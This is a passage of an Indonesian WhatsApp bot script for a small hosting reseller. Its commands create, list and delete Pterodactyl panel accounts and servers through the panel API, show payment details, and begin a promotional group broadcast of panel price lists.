{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gbv2": case "cp2gbv2": case "cp3gbv2": case "cp4gbv2": case "cp5gbv2": case "cp6gbv2": case "cp7gbv2": case "cp8gbv2": case "cp9gbv2": case "cpunliv2": {
if (global.tempuser == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cpunliv2") {
ram = "0"
disknya = "0"
cpu = "0"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return inzieReply(msg.owner)
let username = global.tempuser.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = global.temppw
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${global.temppw.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.tempuser = null
global.temppw = null
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cpunliv3": {
if (global.panel3 == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cpunliv3") {
ram = "0"
disknya = "0"
cpu = "0"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return inzieReply(msg.owner)
let username = global.panel3[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cp16gb": case "cp17gb": case "cp18gb": case "cp19gb": case "cp20gb": case "cp21gb": case "cp22gb": case "cp23gb": case "cp24gb": case "cp25gb": case "cp26gb": case "cp27gb": case "cp28gb": case "cp29gb": case "cp30gb": case "cp31gb": case "cp32gb": case "cp33gb": case "cp34gb": case "cp35gb": case "cp36gb": case "cp37gb": case "cp38gb": case "cp39gb": case "cp40gb": case "cp41gb": case "cp42gb": case "cp43gb": case "cp44gb": case "cp45gb": case "cp46gb": case "cp47gb": case "cp48gb": case "cp49gb": case "cp50gb": case "cpunli": {
if (!isOwner && !isReseller) return inzieReply(msg.owner)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cp16gb") {
ram = "16125"
disknya = "16125"
cpu = "510"
} else if (command == "cp17gb") {
ram = "17125"
disknya = "17125"
cpu = "540"
} else if (command == "cp18gb") {
ram = "18125"
disknya = "18125"
cpu = "570"
} else if (command == "cp19gb") {
ram = "19125"
disknya = "19125"
cpu = "600"
} else if (command == "cp20gb") {
ram = "20125"
disknya = "20125"
cpu = "630"
} else if (command == "cp21gb") {
ram = "21125"
disknya = "21125"
cpu = "660"
} else if (command == "cp22gb") {
ram = "22125"
disknya = "22125"
cpu = "660"
} else if (command == "cp23gb") {
ram = "23125"
disknya = "23125"
cpu = "690"
} else if (command == "cp24gb") {
ram = "24125"
disknya = "24125"
cpu = "720"
} else if (command == "cp25gb") {
ram = "25125"
disknya = "25125"
cpu = "750"
} else if (command == "cp26gb") {
ram = "26125"
disknya = "26125"
cpu = "780"
} else if (command == "cp27gb") {
ram = "27125"
disknya = "27125"
cpu = "810"
} else if (command == "cp28gb") {
ram = "28125"
disknya = "28125"
cpu = "840"
} else if (command == "cp29gb") {
ram = "29125"
disknya = "29125"
cpu = "870"
} else if (command == "cp30gb") {
ram = "30125"
disknya = "30125"
cpu = "900"
} else if (command == "cp31gb") {
ram = "31125"
disknya = "31125"
cpu = "930"
} else if (command == "cp32gb") {
ram = "32125"
disknya = "32125"
cpu = "960"
} else if (command == "cp33gb") {
ram = "33125"
disknya = "33125"
cpu = "990"
} else if (command == "cp34gb") {
ram = "34125"
disknya = "34125"
cpu = "1020"
} else if (command == "cp35gb") {
ram = "35125"
disknya = "35125"
cpu = "1050"
} else if (command == "cp36gb") {
ram = "36125"
disknya = "35125"
cpu = "1080"
} else if (command == "cp37gb") {
ram = "37125"
disknya = "37125"
cpu = "1110"
} else if (command == "cp38gb") {
ram = "38125"
disknya = "38125"
cpu = "1240"
} else if (command == "cp39gb") {
ram = "39125"
disknya = "39125"
cpu = "1270"
} else if (command == "cp40gb") {
ram = "40125"
disknya = "40125"
cpu = "1200"
} else if (command == "cp41gb") {
ram = "41125"
disknya = "41125"
cpu = "1230"
} else if (command == "cp42gb") {
ram = "42125"
disknya = "42125"
cpu = "1260"
} else if (command == "cp43gb") {
ram = "43125"
disknya = "43125"
cpu = "1290"
} else if (command == "cp44gb") {
ram = "44125"
disknya = "44125"
cpu = "1320"
} else if (command == "cp45gb") {
ram = "45125"
disknya = "45125"
cpu = "1350"
} else if (command == "cp46gb") {
ram = "46125"
disknya = "46125"
cpu = "1380"
} else if (command == "cp47gb") {
ram = "47125"
disknya = "47125"
cpu = "1410"
} else if (command == "cp48gb") {
ram = "48125"
disknya = "48125"
cpu = "1440"
} else if (command == "cp49gb") {
ram = "49125"
disknya = "49125"
cpu = "1470"
} else if (command == "cp50gb") {
ram = "50125"
disknya = "50125"
cpu = "1500"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return inzieReply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return inzieReply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await inzie.sendMessage(m.chat, { text: messageText }, { quoted: qtoko })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return inzieReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
case "payment": {
if (!isOwner) return inzieReply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".danapay" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovopay" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS Payment", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'pay':{
const urldana = "https://telegra.ph/file/50a488fd1eb4a71855e30.jpg"
const urlgopay = "false"
const urlovo = "false"
const urlqris = "false"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: inzie.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT DANA 『𝐈𝐍𝐙𝐈𝐄』⚡🌐` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"6289667644225\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT GOPAY 『𝐈𝐍𝐙𝐈𝐄』⚡🌐` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"6289667644225\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlovo),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT PULSA INZIE HOSTING` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"6289667644225\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlqris),
                      hasMediaAttachment: true,
                    },
                    body: { text: `QRIS ALLPAY INZIE HOSTING` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"MINTA AJA)","url":"https:\\/\\/wa.me\\/6289667644225","webview_presentation":null}',
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await inzie.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break
case "danapay": {
if (global.dana == false) return m.reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
inzie.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return m.reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
inzie.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return m.reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
inzie.sendText(m.chat, teks, qchanel)
}
break

case "qrispay": {
let teksnya = `𝗨𝗡𝗧𝗨𝗞 𝗤𝗥𝗜𝗦 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗖𝗛𝗔𝗧 𝗢𝗪𝗡𝗘𝗥 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 𝗦𝗔𝗝𝗔!!!`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Script Bot💌\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "jpmslide": case "startjpmslide": {
if (!isOwner) return inzieReply(msg.owner)
let total = 0
let getGroups = await inzie.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg") }, { upload: inzie.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*𝗜𝗡𝗭𝗜𝗘 𝗛𝗢𝗦𝗧𝗜𝗡𝗚 ⚡🌐* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*LIST PANEL BY INZIE STORE*

> • RAM 1GB | CPU 50% = [ 1.000 ]
> • RAM 2GB | CPU 100% = [ 2.000 ]
> • RAM 3GB | CPU 150% = [ 3.000 ]
> • RAM 4GB | CPU 200% = [ 4.000]
> • RAM 5GB | CPU 250% = [ 5.000 ]
> • RAM 6GB | CPU 300% = [ 6.000 ]
> • RAM 7GB | CPU 350% = [ 7.000 ]
> • RAM 8GB | CPU 400% = [ 8.000 ]
> • RAM 9GB | CPU 450% = [ 9.000 ]
> • RAM 10GB | CPU 500% = [ 10.000 ]
> • RAM UNLI | CPU UNLI = [ 12.000 ]

_KEUNTUNGAN MEMBELI PANEL_
- WEB CLOSE BOT TTP ON
- HEMAT MEMO
- HEMAT DATA
- SRV AMAN
- DLL

PAYMENT

DANA✅
QRIS✅`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `READY PANEL PRIVATE

*LIST PANEL BY INZIE STORE*


 • RAM 2GB | CPU 200% = [ 2.500 ]
 • RAM 4GB | CPU 400% = [ 5.000]
 • RAM 6GB | CPU 600% = [ 7.000 ]
 • RAM 8GB | CPU 800% = [ 9.000 ]
 • RAM 9GB | CPU 900% = [ 10.000 ]
 • RAM 10GB | CPU 900% =[ 12.000 ]
